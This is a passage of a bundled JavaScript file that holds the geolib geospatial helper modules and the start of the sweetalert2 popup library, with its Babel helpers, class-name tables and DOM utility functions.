  var require_isPointNearLine = __commonJS({
    "node_modules/geolib/es/isPointNearLine.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistanceFromLine = _interopRequireDefault(require_getDistanceFromLine());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isPointNearLine = function isPointNearLine2(point, start2, end, distance) {
        return (0, _getDistanceFromLine.default)(point, start2, end) < distance;
      };
      var _default = isPointNearLine;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/isPointWithinRadius.js
  var require_isPointWithinRadius = __commonJS({
    "node_modules/geolib/es/isPointWithinRadius.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      var _getDistance = _interopRequireDefault(require_getDistance());
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
      var isPointWithinRadius = function isPointWithinRadius2(point, center, radius) {
        var accuracy = 0.01;
        return (0, _getDistance.default)(point, center, accuracy) < radius;
      };
      var _default = isPointWithinRadius;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/wktToPolygon.js
  var require_wktToPolygon = __commonJS({
    "node_modules/geolib/es/wktToPolygon.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      exports2.default = void 0;
      function _slicedToArray(arr, i) {
        return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
      }
      function _nonIterableRest() {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _unsupportedIterableToArray(o, minLen) {
        if (!o)
          return;
        if (typeof o === "string")
          return _arrayLikeToArray(o, minLen);
        var n = Object.prototype.toString.call(o).slice(8, -1);
        if (n === "Object" && o.constructor)
          n = o.constructor.name;
        if (n === "Map" || n === "Set")
          return Array.from(o);
        if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
          return _arrayLikeToArray(o, minLen);
      }
      function _arrayLikeToArray(arr, len) {
        if (len == null || len > arr.length)
          len = arr.length;
        for (var i = 0, arr2 = new Array(len); i < len; i++) {
          arr2[i] = arr[i];
        }
        return arr2;
      }
      function _iterableToArrayLimit(arr, i) {
        if (typeof Symbol === "undefined" || !(Symbol.iterator in Object(arr)))
          return;
        var _arr = [];
        var _n = true;
        var _d = false;
        var _e = void 0;
        try {
          for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) {
            _arr.push(_s.value);
            if (i && _arr.length === i)
              break;
          }
        } catch (err) {
          _d = true;
          _e = err;
        } finally {
          try {
            if (!_n && _i["return"] != null)
              _i["return"]();
          } finally {
            if (_d)
              throw _e;
          }
        }
        return _arr;
      }
      function _arrayWithHoles(arr) {
        if (Array.isArray(arr))
          return arr;
      }
      var wktToPolygon = function wktToPolygon2(wkt) {
        if (!wkt.startsWith("POLYGON")) {
          throw new Error("Invalid wkt.");
        }
        var coordsText = wkt.slice(wkt.indexOf("(") + 2, wkt.indexOf(")")).split(", ");
        var polygon = coordsText.map(function(coordText) {
          var _coordText$split = coordText.split(" "), _coordText$split2 = _slicedToArray(_coordText$split, 2), longitude = _coordText$split2[0], latitude = _coordText$split2[1];
          return { longitude: parseFloat(longitude), latitude: parseFloat(latitude) };
        });
        return polygon;
      };
      var _default = wktToPolygon;
      exports2.default = _default;
    }
  });

  // node_modules/geolib/es/index.js
  var require_es = __commonJS({
    "node_modules/geolib/es/index.js"(exports2) {
      "use strict";
      Object.defineProperty(exports2, "__esModule", { value: true });
      var _exportNames = { computeDestinationPoint: true, convertArea: true, convertDistance: true, convertSpeed: true, decimalToSexagesimal: true, findNearest: true, getAreaOfPolygon: true, getBounds: true, getBoundsOfDistance: true, getCenter: true, getCenterOfBounds: true, getCompassDirection: true, getCoordinateKey: true, getCoordinateKeys: true, getDistance: true, getDistanceFromLine: true, getGreatCircleBearing: true, getLatitude: true, getLongitude: true, getPathLength: true, getPreciseDistance: true, getRhumbLineBearing: true, getRoughCompassDirection: true, getSpeed: true, isDecimal: true, isPointInLine: true, isPointInPolygon: true, isPointNearLine: true, isPointWithinRadius: true, isSexagesimal: true, isValidCoordinate: true, isValidLatitude: true, isValidLongitude: true, orderByDistance: true, sexagesimalToDecimal: true, toDecimal: true, toRad: true, toDeg: true, wktToPolygon: true };
      Object.defineProperty(exports2, "computeDestinationPoint", { enumerable: true, get: function get() {
        return _computeDestinationPoint.default;
      } });
      Object.defineProperty(exports2, "convertArea", { enumerable: true, get: function get() {
        return _convertArea.default;
      } });
      Object.defineProperty(exports2, "convertDistance", { enumerable: true, get: function get() {
        return _convertDistance.default;
      } });
      Object.defineProperty(exports2, "convertSpeed", { enumerable: true, get: function get() {
        return _convertSpeed.default;
      } });
      Object.defineProperty(exports2, "decimalToSexagesimal", { enumerable: true, get: function get() {
        return _decimalToSexagesimal.default;
      } });
      Object.defineProperty(exports2, "findNearest", { enumerable: true, get: function get() {
        return _findNearest.default;
      } });
      Object.defineProperty(exports2, "getAreaOfPolygon", { enumerable: true, get: function get() {
        return _getAreaOfPolygon.default;
      } });
      Object.defineProperty(exports2, "getBounds", { enumerable: true, get: function get() {
        return _getBounds.default;
      } });
      Object.defineProperty(exports2, "getBoundsOfDistance", { enumerable: true, get: function get() {
        return _getBoundsOfDistance.default;
      } });
      Object.defineProperty(exports2, "getCenter", { enumerable: true, get: function get() {
        return _getCenter.default;
      } });
      Object.defineProperty(exports2, "getCenterOfBounds", { enumerable: true, get: function get() {
        return _getCenterOfBounds.default;
      } });
      Object.defineProperty(exports2, "getCompassDirection", { enumerable: true, get: function get() {
        return _getCompassDirection.default;
      } });
      Object.defineProperty(exports2, "getCoordinateKey", { enumerable: true, get: function get() {
        return _getCoordinateKey.default;
      } });
      Object.defineProperty(exports2, "getCoordinateKeys", { enumerable: true, get: function get() {
        return _getCoordinateKeys.default;
      } });
      Object.defineProperty(exports2, "getDistance", { enumerable: true, get: function get() {
        return _getDistance.default;
      } });
      Object.defineProperty(exports2, "getDistanceFromLine", { enumerable: true, get: function get() {
        return _getDistanceFromLine.default;
      } });
      Object.defineProperty(exports2, "getGreatCircleBearing", { enumerable: true, get: function get() {
        return _getGreatCircleBearing.default;
      } });
      Object.defineProperty(exports2, "getLatitude", { enumerable: true, get: function get() {
        return _getLatitude.default;
      } });
      Object.defineProperty(exports2, "getLongitude", { enumerable: true, get: function get() {
        return _getLongitude.default;
      } });
      Object.defineProperty(exports2, "getPathLength", { enumerable: true, get: function get() {
        return _getPathLength.default;
      } });
      Object.defineProperty(exports2, "getPreciseDistance", { enumerable: true, get: function get() {
        return _getPreciseDistance.default;
      } });
      Object.defineProperty(exports2, "getRhumbLineBearing", { enumerable: true, get: function get() {
        return _getRhumbLineBearing.default;
      } });
      Object.defineProperty(exports2, "getRoughCompassDirection", { enumerable: true, get: function get() {
        return _getRoughCompassDirection.default;
      } });
      Object.defineProperty(exports2, "getSpeed", { enumerable: true, get: function get() {
        return _getSpeed.default;
      } });
      Object.defineProperty(exports2, "isDecimal", { enumerable: true, get: function get() {
        return _isDecimal.default;
      } });
      Object.defineProperty(exports2, "isPointInLine", { enumerable: true, get: function get() {
        return _isPointInLine.default;
      } });
      Object.defineProperty(exports2, "isPointInPolygon", { enumerable: true, get: function get() {
        return _isPointInPolygon.default;
      } });
      Object.defineProperty(exports2, "isPointNearLine", { enumerable: true, get: function get() {
        return _isPointNearLine.default;
      } });
      Object.defineProperty(exports2, "isPointWithinRadius", { enumerable: true, get: function get() {
        return _isPointWithinRadius.default;
      } });
      Object.defineProperty(exports2, "isSexagesimal", { enumerable: true, get: function get() {
        return _isSexagesimal.default;
      } });
      Object.defineProperty(exports2, "isValidCoordinate", { enumerable: true, get: function get() {
        return _isValidCoordinate.default;
      } });
      Object.defineProperty(exports2, "isValidLatitude", { enumerable: true, get: function get() {
        return _isValidLatitude.default;
      } });
      Object.defineProperty(exports2, "isValidLongitude", { enumerable: true, get: function get() {
        return _isValidLongitude.default;
      } });
      Object.defineProperty(exports2, "orderByDistance", { enumerable: true, get: function get() {
        return _orderByDistance.default;
      } });
      Object.defineProperty(exports2, "sexagesimalToDecimal", { enumerable: true, get: function get() {
        return _sexagesimalToDecimal.default;
      } });
      Object.defineProperty(exports2, "toDecimal", { enumerable: true, get: function get() {
        return _toDecimal.default;
      } });
      Object.defineProperty(exports2, "toRad", { enumerable: true, get: function get() {
        return _toRad.default;
      } });
      Object.defineProperty(exports2, "toDeg", { enumerable: true, get: function get() {
        return _toDeg.default;
      } });
      Object.defineProperty(exports2, "wktToPolygon", { enumerable: true, get: function get() {
        return _wktToPolygon.default;
      } });
      var _computeDestinationPoint = _interopRequireDefault(require_computeDestinationPoint());
      var _convertArea = _interopRequireDefault(require_convertArea());
      var _convertDistance = _interopRequireDefault(require_convertDistance());
      var _convertSpeed = _interopRequireDefault(require_convertSpeed());
      var _decimalToSexagesimal = _interopRequireDefault(require_decimalToSexagesimal());
      var _findNearest = _interopRequireDefault(require_findNearest());
      var _getAreaOfPolygon = _interopRequireDefault(require_getAreaOfPolygon());
      var _getBounds = _interopRequireDefault(require_getBounds());
      var _getBoundsOfDistance = _interopRequireDefault(require_getBoundsOfDistance());
      var _getCenter = _interopRequireDefault(require_getCenter());
      var _getCenterOfBounds = _interopRequireDefault(require_getCenterOfBounds());
      var _getCompassDirection = _interopRequireDefault(require_getCompassDirection());
      var _getCoordinateKey = _interopRequireDefault(require_getCoordinateKey());
      var _getCoordinateKeys = _interopRequireDefault(require_getCoordinateKeys());
      var _getDistance = _interopRequireDefault(require_getDistance());
      var _getDistanceFromLine = _interopRequireDefault(require_getDistanceFromLine());
      var _getGreatCircleBearing = _interopRequireDefault(require_getGreatCircleBearing());
      var _getLatitude = _interopRequireDefault(require_getLatitude());
      var _getLongitude = _interopRequireDefault(require_getLongitude());
      var _getPathLength = _interopRequireDefault(require_getPathLength());
      var _getPreciseDistance = _interopRequireDefault(require_getPreciseDistance());
      var _getRhumbLineBearing = _interopRequireDefault(require_getRhumbLineBearing());
      var _getRoughCompassDirection = _interopRequireDefault(require_getRoughCompassDirection());
      var _getSpeed = _interopRequireDefault(require_getSpeed());
      var _isDecimal = _interopRequireDefault(require_isDecimal());
      var _isPointInLine = _interopRequireDefault(require_isPointInLine());
      var _isPointInPolygon = _interopRequireDefault(require_isPointInPolygon());
      var _isPointNearLine = _interopRequireDefault(require_isPointNearLine());
      var _isPointWithinRadius = _interopRequireDefault(require_isPointWithinRadius());
      var _isSexagesimal = _interopRequireDefault(require_isSexagesimal());
      var _isValidCoordinate = _interopRequireDefault(require_isValidCoordinate());
      var _isValidLatitude = _interopRequireDefault(require_isValidLatitude());
      var _isValidLongitude = _interopRequireDefault(require_isValidLongitude());
      var _orderByDistance = _interopRequireDefault(require_orderByDistance());
      var _sexagesimalToDecimal = _interopRequireDefault(require_sexagesimalToDecimal());
      var _toDecimal = _interopRequireDefault(require_toDecimal());
      var _toRad = _interopRequireDefault(require_toRad());
      var _toDeg = _interopRequireDefault(require_toDeg());
      var _wktToPolygon = _interopRequireDefault(require_wktToPolygon());
      var _constants = require_constants();
      Object.keys(_constants).forEach(function(key) {
        if (key === "default" || key === "__esModule")
          return;
        if (Object.prototype.hasOwnProperty.call(_exportNames, key))
          return;
        Object.defineProperty(exports2, key, { enumerable: true, get: function get() {
          return _constants[key];
        } });
      });
      function _interopRequireDefault(obj) {
        return obj && obj.__esModule ? obj : { default: obj };
      }
    }
  });

  // node_modules/sweetalert2/dist/sweetalert2.all.js
  var require_sweetalert2_all = __commonJS({
    "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports2, module2) {
      (function(global2, factory) {
        typeof exports2 === "object" && typeof module2 !== "undefined" ? module2.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global2 = typeof globalThis !== "undefined" ? globalThis : global2 || self, global2.Sweetalert2 = factory());
      })(exports2, function() {
        "use strict";
        function _callSuper(t, o, e) {
          return o = _getPrototypeOf(o), _possibleConstructorReturn(t, _isNativeReflectConstruct() ? Reflect.construct(o, e || [], _getPrototypeOf(t).constructor) : o.apply(t, e));
        }
        function _construct(t, e, r) {
          if (_isNativeReflectConstruct())
            return Reflect.construct.apply(null, arguments);
          var o = [null];
          o.push.apply(o, e);
          var p = new (t.bind.apply(t, o))();
          return r && _setPrototypeOf(p, r.prototype), p;
        }
        function _isNativeReflectConstruct() {
          try {
            var t = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
            }));
          } catch (t2) {
          }
          return (_isNativeReflectConstruct = function() {
            return !!t;
          })();
        }
        function _iterableToArrayLimit(r, l) {
          var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
          if (null != t) {
            var e, n, i, u, a = [], f = true, o = false;
            try {
              if (i = (t = t.call(r)).next, 0 === l) {
                if (Object(t) !== t)
                  return;
                f = false;
              } else
                for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = true)
                  ;
            } catch (r2) {
              o = true, n = r2;
            } finally {
              try {
                if (!f && null != t.return && (u = t.return(), Object(u) !== u))
                  return;
              } finally {
                if (o)
                  throw n;
              }
            }
            return a;
          }
        }
        function _toPrimitive(t, r) {
          if ("object" != typeof t || !t)
            return t;
          var e = t[Symbol.toPrimitive];
          if (void 0 !== e) {
            var i = e.call(t, r || "default");
            if ("object" != typeof i)
              return i;
            throw new TypeError("@@toPrimitive must return a primitive value.");
          }
          return ("string" === r ? String : Number)(t);
        }
        function _toPropertyKey(t) {
          var i = _toPrimitive(t, "string");
          return "symbol" == typeof i ? i : String(i);
        }
        function _typeof(o) {
          "@babel/helpers - typeof";
          return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(o2) {
            return typeof o2;
          } : function(o2) {
            return o2 && "function" == typeof Symbol && o2.constructor === Symbol && o2 !== Symbol.prototype ? "symbol" : typeof o2;
          }, _typeof(o);
        }
        function _classCallCheck(instance, Constructor) {
          if (!(instance instanceof Constructor)) {
            throw new TypeError("Cannot call a class as a function");
          }
        }
        function _defineProperties(target, props) {
          for (var i = 0; i < props.length; i++) {
            var descriptor = props[i];
            descriptor.enumerable = descriptor.enumerable || false;
            descriptor.configurable = true;
            if ("value" in descriptor)
              descriptor.writable = true;
            Object.defineProperty(target, _toPropertyKey(descriptor.key), descriptor);
          }
        }
        function _createClass(Constructor, protoProps, staticProps) {
          if (protoProps)
            _defineProperties(Constructor.prototype, protoProps);
          if (staticProps)
            _defineProperties(Constructor, staticProps);
          Object.defineProperty(Constructor, "prototype", {
            writable: false
          });
          return Constructor;
        }
        function _inherits(subClass, superClass) {
          if (typeof superClass !== "function" && superClass !== null) {
            throw new TypeError("Super expression must either be null or a function");
          }
          subClass.prototype = Object.create(superClass && superClass.prototype, {
            constructor: {
              value: subClass,
              writable: true,
              configurable: true
            }
          });
          Object.defineProperty(subClass, "prototype", {
            writable: false
          });
          if (superClass)
            _setPrototypeOf(subClass, superClass);
        }
        function _getPrototypeOf(o) {
          _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function _getPrototypeOf2(o2) {
            return o2.__proto__ || Object.getPrototypeOf(o2);
          };
          return _getPrototypeOf(o);
        }
        function _setPrototypeOf(o, p) {
          _setPrototypeOf = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function _setPrototypeOf2(o2, p2) {
            o2.__proto__ = p2;
            return o2;
          };
          return _setPrototypeOf(o, p);
        }
        function _assertThisInitialized(self2) {
          if (self2 === void 0) {
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
          }
          return self2;
        }
        function _possibleConstructorReturn(self2, call) {
          if (call && (typeof call === "object" || typeof call === "function")) {
            return call;
          } else if (call !== void 0) {
            throw new TypeError("Derived constructors may only return object or undefined");
          }
          return _assertThisInitialized(self2);
        }
        function _superPropBase(object, property) {
          while (!Object.prototype.hasOwnProperty.call(object, property)) {
            object = _getPrototypeOf(object);
            if (object === null)
              break;
          }
          return object;
        }
        function _get() {
          if (typeof Reflect !== "undefined" && Reflect.get) {
            _get = Reflect.get.bind();
          } else {
            _get = function _get2(target, property, receiver) {
              var base = _superPropBase(target, property);
              if (!base)
                return;
              var desc = Object.getOwnPropertyDescriptor(base, property);
              if (desc.get) {
                return desc.get.call(arguments.length < 3 ? target : receiver);
              }
              return desc.value;
            };
          }
          return _get.apply(this, arguments);
        }
        function _slicedToArray(arr, i) {
          return _arrayWithHoles(arr) || _iterableToArrayLimit(arr, i) || _unsupportedIterableToArray(arr, i) || _nonIterableRest();
        }
        function _toConsumableArray(arr) {
          return _arrayWithoutHoles(arr) || _iterableToArray(arr) || _unsupportedIterableToArray(arr) || _nonIterableSpread();
        }
        function _arrayWithoutHoles(arr) {
          if (Array.isArray(arr))
            return _arrayLikeToArray(arr);
        }
        function _arrayWithHoles(arr) {
          if (Array.isArray(arr))
            return arr;
        }
        function _iterableToArray(iter) {
          if (typeof Symbol !== "undefined" && iter[Symbol.iterator] != null || iter["@@iterator"] != null)
            return Array.from(iter);
        }
        function _unsupportedIterableToArray(o, minLen) {
          if (!o)
            return;
          if (typeof o === "string")
            return _arrayLikeToArray(o, minLen);
          var n = Object.prototype.toString.call(o).slice(8, -1);
          if (n === "Object" && o.constructor)
            n = o.constructor.name;
          if (n === "Map" || n === "Set")
            return Array.from(o);
          if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))
            return _arrayLikeToArray(o, minLen);
        }
        function _arrayLikeToArray(arr, len) {
          if (len == null || len > arr.length)
            len = arr.length;
          for (var i = 0, arr2 = new Array(len); i < len; i++)
            arr2[i] = arr[i];
          return arr2;
        }
        function _nonIterableSpread() {
          throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }
        function _nonIterableRest() {
          throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }
        function _classPrivateFieldGet(receiver, privateMap) {
          var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "get");
          return _classApplyDescriptorGet(receiver, descriptor);
        }
        function _classPrivateFieldSet(receiver, privateMap, value) {
          var descriptor = _classExtractFieldDescriptor(receiver, privateMap, "set");
          _classApplyDescriptorSet(receiver, descriptor, value);
          return value;
        }
        function _classExtractFieldDescriptor(receiver, privateMap, action) {
          if (!privateMap.has(receiver)) {
            throw new TypeError("attempted to " + action + " private field on non-instance");
          }
          return privateMap.get(receiver);
        }
        function _classApplyDescriptorGet(receiver, descriptor) {
          if (descriptor.get) {
            return descriptor.get.call(receiver);
          }
          return descriptor.value;
        }
        function _classApplyDescriptorSet(receiver, descriptor, value) {
          if (descriptor.set) {
            descriptor.set.call(receiver, value);
          } else {
            if (!descriptor.writable) {
              throw new TypeError("attempted to set read only private field");
            }
            descriptor.value = value;
          }
        }
        function _checkPrivateRedeclaration(obj, privateCollection) {
          if (privateCollection.has(obj)) {
            throw new TypeError("Cannot initialize the same private elements twice on an object");
          }
        }
        function _classPrivateFieldInitSpec(obj, privateMap, value) {
          _checkPrivateRedeclaration(obj, privateMap);
          privateMap.set(obj, value);
        }
        var RESTORE_FOCUS_TIMEOUT = 100;
        var globalState = {};
        var focusPreviousActiveElement = function focusPreviousActiveElement2() {
          if (globalState.previousActiveElement instanceof HTMLElement) {
            globalState.previousActiveElement.focus();
            globalState.previousActiveElement = null;
          } else if (document.body) {
            document.body.focus();
          }
        };
        var restoreActiveElement = function restoreActiveElement2(returnFocus) {
          return new Promise(function(resolve) {
            if (!returnFocus) {
              return resolve();
            }
            var x = window.scrollX;
            var y = window.scrollY;
            globalState.restoreFocusTimeout = setTimeout(function() {
              focusPreviousActiveElement();
              resolve();
            }, RESTORE_FOCUS_TIMEOUT);
            window.scrollTo(x, y);
          });
        };
        var swalPrefix = "swal2-";
        var classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
        var swalClasses = classNames.reduce(
          function(acc, className) {
            acc[className] = swalPrefix + className;
            return acc;
          },
          /** @type {SwalClasses} */
          {}
        );
        var icons = ["success", "warning", "info", "question", "error"];
        var iconTypes = icons.reduce(
          function(acc, icon) {
            acc[icon] = swalPrefix + icon;
            return acc;
          },
          /** @type {SwalIcons} */
          {}
        );
        var consolePrefix = "SweetAlert2:";
        var capitalizeFirstLetter = function capitalizeFirstLetter2(str) {
          return str.charAt(0).toUpperCase() + str.slice(1);
        };
        var warn = function warn2(message) {
          console.warn("".concat(consolePrefix, " ").concat(_typeof(message) === "object" ? message.join(" ") : message));
        };
        var error2 = function error3(message) {
          console.error("".concat(consolePrefix, " ").concat(message));
        };
        var previousWarnOnceMessages = [];
        var warnOnce = function warnOnce2(message) {
          if (!previousWarnOnceMessages.includes(message)) {
            previousWarnOnceMessages.push(message);
            warn(message);
          }
        };
        var warnAboutDeprecation = function warnAboutDeprecation2(deprecatedParam, useInstead) {
          warnOnce('"'.concat(deprecatedParam, '" is deprecated and will be removed in the next major release. Please use "').concat(useInstead, '" instead.'));
        };
        var callIfFunction = function callIfFunction2(arg) {
          return typeof arg === "function" ? arg() : arg;
        };
        var hasToPromiseFn = function hasToPromiseFn2(arg) {
          return arg && typeof arg.toPromise === "function";
        };
        var asPromise = function asPromise2(arg) {
          return hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
        };
        var isPromise = function isPromise2(arg) {
          return arg && Promise.resolve(arg) === arg;
        };
        var getContainer = function getContainer2() {
          return document.body.querySelector(".".concat(swalClasses.container));
        };
        var elementBySelector = function elementBySelector2(selectorString) {
          var container = getContainer();
          return container ? container.querySelector(selectorString) : null;
        };
        var elementByClass = function elementByClass2(className) {
          return elementBySelector(".".concat(className));
        };
        var getPopup = function getPopup2() {
          return elementByClass(swalClasses.popup);
        };
        var getIcon = function getIcon2() {
          return elementByClass(swalClasses.icon);
        };
        var getIconContent = function getIconContent2() {
          return elementByClass(swalClasses["icon-content"]);
        };
        var getTitle = function getTitle2() {
          return elementByClass(swalClasses.title);
        };
        var getHtmlContainer = function getHtmlContainer2() {
          return elementByClass(swalClasses["html-container"]);
        };
        var getImage = function getImage2() {
          return elementByClass(swalClasses.image);
        };
        var getProgressSteps = function getProgressSteps2() {
          return elementByClass(swalClasses["progress-steps"]);
        };
        var getValidationMessage = function getValidationMessage2() {
          return elementByClass(swalClasses["validation-message"]);
        };
        var getConfirmButton = function getConfirmButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.confirm))
          );
        };
        var getCancelButton = function getCancelButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.cancel))
          );
        };
        var getDenyButton = function getDenyButton2() {
          return (
            /** @type {HTMLButtonElement} */
            elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.deny))
          );
        };
        var getInputLabel = function getInputLabel2() {
          return elementByClass(swalClasses["input-label"]);
        };
        var getLoader = function getLoader2() {
          return elementBySelector(".".concat(swalClasses.loader));
        };
        var getActions = function getActions2() {
          return elementByClass(swalClasses.actions);
        };
        var getFooter = function getFooter2() {
          return elementByClass(swalClasses.footer);
        };
        var getTimerProgressBar = function getTimerProgressBar2() {
          return elementByClass(swalClasses["timer-progress-bar"]);
        };
        var getCloseButton = function getCloseButton2() {
          return elementByClass(swalClasses.close);
        };
        var focusable = '\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n';
        var getFocusableElements = function getFocusableElements2() {
          var popup = getPopup();
          if (!popup) {
            return [];
          }
          var focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
          var focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort(function(a, b) {
            var tabindexA = parseInt(a.getAttribute("tabindex") || "0");
            var tabindexB = parseInt(b.getAttribute("tabindex") || "0");
            if (tabindexA > tabindexB) {
              return 1;
            } else if (tabindexA < tabindexB) {
              return -1;
            }
            return 0;
          });
          var otherFocusableElements = popup.querySelectorAll(focusable);
          var otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter(function(el) {
            return el.getAttribute("tabindex") !== "-1";
          });
          return _toConsumableArray(new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))).filter(function(el) {
            return isVisible$1(el);
          });
        };
        var isModal = function isModal2() {
          return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
        };
        var isToast = function isToast2() {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          return hasClass(popup, swalClasses.toast);
        };
        var isLoading = function isLoading2() {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          return popup.hasAttribute("data-loading");
        };
        var setInnerHtml = function setInnerHtml2(elem, html) {
          elem.textContent = "";
          if (html) {
            var parser = new DOMParser();
            var parsed = parser.parseFromString(html, "text/html");
            var head = parsed.querySelector("head");
            head && Array.from(head.childNodes).forEach(function(child) {
              elem.appendChild(child);
            });
            var body = parsed.querySelector("body");
            body && Array.from(body.childNodes).forEach(function(child) {
              if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                elem.appendChild(child.cloneNode(true));
              } else {
                elem.appendChild(child);
              }
            });
          }
        };
        var hasClass = function hasClass2(elem, className) {
          if (!className) {
            return false;
          }
          var classList = className.split(/\s+/);
          for (var i = 0; i < classList.length; i++) {
            if (!elem.classList.contains(classList[i])) {
              return false;
            }
          }
          return true;
        };
        var removeCustomClasses = function removeCustomClasses2(elem, params) {
          Array.from(elem.classList).forEach(function(className) {
            if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
              elem.classList.remove(className);
            }
          });
        };
        var applyCustomClass = function applyCustomClass2(elem, params, className) {
          removeCustomClasses(elem, params);
          if (params.customClass && params.customClass[className]) {
            if (typeof params.customClass[className] !== "string" && !params.customClass[className].forEach) {
              warn("Invalid type of customClass.".concat(className, '! Expected string or iterable object, got "').concat(_typeof(params.customClass[className]), '"'));
              return;
            }
            addClass(elem, params.customClass[className]);
          }
        };
        var getInput$1 = function getInput2(popup, inputClass) {
          if (!inputClass) {
            return null;
          }
          switch (inputClass) {
            case "select":
            case "textarea":
            case "file":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses[inputClass]));
            case "checkbox":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.checkbox, " input"));
            case "radio":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:checked")) || popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:first-child"));
            case "range":
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.range, " input"));
            default:
              return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.input));
          }
        };
        var focusInput = function focusInput2(input) {
          input.focus();
          if (input.type !== "file") {
            var val = input.value;
            input.value = "";
            input.value = val;
          }
        };
        var toggleClass = function toggleClass2(target, classList, condition) {
          if (!target || !classList) {
            return;
          }
          if (typeof classList === "string") {
            classList = classList.split(/\s+/).filter(Boolean);
          }
          classList.forEach(function(className) {
            if (Array.isArray(target)) {
              target.forEach(function(elem) {
                condition ? elem.classList.add(className) : elem.classList.remove(className);
              });
            } else {
              condition ? target.classList.add(className) : target.classList.remove(className);
            }
          });
        };
        var addClass = function addClass2(target, classList) {
          toggleClass(target, classList, true);
        };
        var removeClass = function removeClass2(target, classList) {
          toggleClass(target, classList, false);
        };
        var getDirectChildByClass = function getDirectChildByClass2(elem, className) {
          var children = Array.from(elem.children);
          for (var i = 0; i < children.length; i++) {
            var child = children[i];
            if (child instanceof HTMLElement && hasClass(child, className)) {
              return child;
            }
          }
        };
        var applyNumericalStyle = function applyNumericalStyle2(elem, property, value) {
          if (value === "".concat(parseInt(value))) {
            value = parseInt(value);
          }
          if (value || parseInt(value) === 0) {
            elem.style.setProperty(property, typeof value === "number" ? "".concat(value, "px") : value);
          } else {
            elem.style.removeProperty(property);
          }
        };
        var show = function show2(elem) {
          var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
          elem && (elem.style.display = display);
        };
        var hide = function hide2(elem) {
          elem && (elem.style.display = "none");
        };
        var showWhenInnerHtmlPresent = function showWhenInnerHtmlPresent2(elem) {
          var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
          if (!elem) {
            return;
          }
          new MutationObserver(function() {
            toggle2(elem, elem.innerHTML, display);
          }).observe(elem, {
            childList: true,
            subtree: true
          });
        };
